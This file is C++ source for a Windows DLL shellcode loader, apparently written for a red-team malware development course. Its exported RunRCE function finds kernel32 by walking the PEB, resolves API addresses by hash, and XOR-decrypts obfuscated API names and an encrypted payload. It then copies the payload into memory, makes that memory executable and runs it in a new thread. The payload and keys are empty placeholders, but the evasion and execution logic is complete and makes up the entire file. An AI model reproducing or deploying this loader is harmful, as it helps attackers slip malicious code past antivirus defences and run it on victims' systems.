/*
pekaboo.cpp - inspired by RTO malware development course implementation
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define KERNEL32_HASH 0x00000000
#define GETMODULEHANDLE_HASH 0x00000000
#define GETPROCADDRESS_HASH 0x00000000

// encrypted payload
unsigned char my_payload[] = { };

// encrypted functions
unsigned char s_va[] = { };
unsigned char s_vp[] = { };
unsigned char s_ct[] = { };
unsigned char s_wfso[] = { };
unsigned char s_rmm[] = { };

unsigned int my_payload_len = sizeof(my_payload);
unsigned int s_va_len = sizeof(s_va);
unsigned int s_vp_len = sizeof(s_vp);
unsigned int s_ct_len = sizeof(s_ct);
unsigned int s_wfso_len = sizeof(s_wfso);
unsigned int s_rmm_len = sizeof(s_rmm);

// keys
char my_payload_key[] = "";
char s_va_key[] = "";
char s_vp_key[] = "";
char s_ct_key[] = "";
char s_wfso_key[] = "";
char s_rmm_key[] = "";

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING;

struct LDR_MODULE {
  LIST_ENTRY e[3];
  HMODULE base;
  void* entry;
  UINT size;
  UNICODE_STRING dllPath;
  UNICODE_STRING dllname;
};

// LPVOID (WINAPI * ppVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

typedef PVOID(WINAPI *pVirtualAlloc)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);


BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
HANDLE (WINAPI * pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
DWORD (WINAPI * pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
VOID (WINAPI * pRtlMoveMemory)(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
);

typedef HMODULE(WINAPI *pGetModuleHandleA)(
  LPCSTR lpModuleName
);

typedef FARPROC(WINAPI *pGetProcAddress)(
  HMODULE hModule,
  LPCSTR  lpProcName
);

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
  int j;

  j = 0;
  for (int i = 0; i < data_len; i++) {
    if (j == key_len - 1) j = 0;
    data[i] = data[i] ^ key[j];
    j++;
  }
}

DWORD calcMyHash(char* data) {
  DWORD hash = 0x35;
  for (int i = 0; i < strlen(data); i++) {
    hash += data[i] + (hash << 1);
  }
  return hash;
}

static DWORD calcMyHashBase(LDR_MODULE* mdll) {
  char name[64];
  size_t i = 0;

  while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
    name[i] = (char)mdll->dllname.Buffer[i];
    i++;
  }
  name[i] = 0;
  return calcMyHash((char *)CharLowerA(name));
}

static HMODULE getKernel32(DWORD myHash) {
  HMODULE kernel32;
  INT_PTR peb = __readgsqword(0x60);
  auto modList = 0x18;
  auto modListFlink = 0x18;
  auto kernelBaseAddr = 0x10;

  auto mdllist = *(INT_PTR*)(peb + modList);
  auto mlink = *(INT_PTR*)(mdllist + modListFlink);
  auto krnbase = *(INT_PTR*)(mlink + kernelBaseAddr);
  auto mdl = (LDR_MODULE*)mlink;
  do {
    mdl = (LDR_MODULE*)mdl->e[0].Flink;
    if (mdl->base != nullptr) {
      if (calcMyHashBase(mdl) == myHash) { // kernel32.dll hash
        break;
      }
    }
  } while (mlink != (INT_PTR)mdl);

  kernel32 = (HMODULE)mdl->base;
  return kernel32;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
  PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
  PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h + img_dos_header->e_lfanew);
  PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
    (LPBYTE)h + img_nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
  PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
  PWORD  fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

  for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
    LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);

    if (calcMyHash(pFuncName) == myHash) {
      // printf("successfully found! %s - %d\n", pFuncName, myHash);
      return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
  }
  return nullptr;
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call)  {
  case DLL_PROCESS_ATTACH:
  case DLL_PROCESS_DETACH:
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
      break;
  }
  return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunRCE(void) {
  void * exec_mem;
  BOOL rv;
  HANDLE th;
  DWORD oldprotect = 0;

  HMODULE mod = getKernel32(KERNEL32_HASH);
  pGetModuleHandleA myGetModuleHandleA = (pGetModuleHandleA)getAPIAddr(mod, GETMODULEHANDLE_HASH);
  pGetProcAddress myGetProcAddress = (pGetProcAddress)getAPIAddr(mod, GETPROCADDRESS_HASH);
  HMODULE hk32 = myGetModuleHandleA("kernel32.dll");

  // decrypt VirtualAlloc
  XOR((char *) s_va, s_va_len, s_va_key, sizeof(s_va_key));
  // ppVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), s_va);
  pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)myGetProcAddress(hk32, s_va);
  // printf("%d\n", myGetProcAddress(hk32, s_va));

  // allocate memory for payload
  // exec_mem = ppVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  exec_mem = myVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // decrypt payload
  XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));

  // copy payload to allocated buffer
  XOR((char *) s_rmm, s_rmm_len, s_rmm_key, sizeof(s_rmm_key));
  pRtlMoveMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_rmm);
  pRtlMoveMemory(exec_mem, my_payload, my_payload_len);

  // decrypt VirtualProtect
  XOR((char *) s_vp, s_vp_len, s_vp_key, sizeof(s_vp_key));
  pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vp);
  rv = pVirtualProtect(exec_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);

  // if all good, launch the payload
  if ( rv != 0 ) {

      // decrypt CreateThread
      XOR((char *) s_ct, s_ct_len, s_ct_key, sizeof(s_ct_key));
      pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_ct);
      th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);

      // decrypt WaitForSingleObject
      XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
      pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
      pWaitForSingleObject(th, -1);
  }
  return TRUE;
  }
}
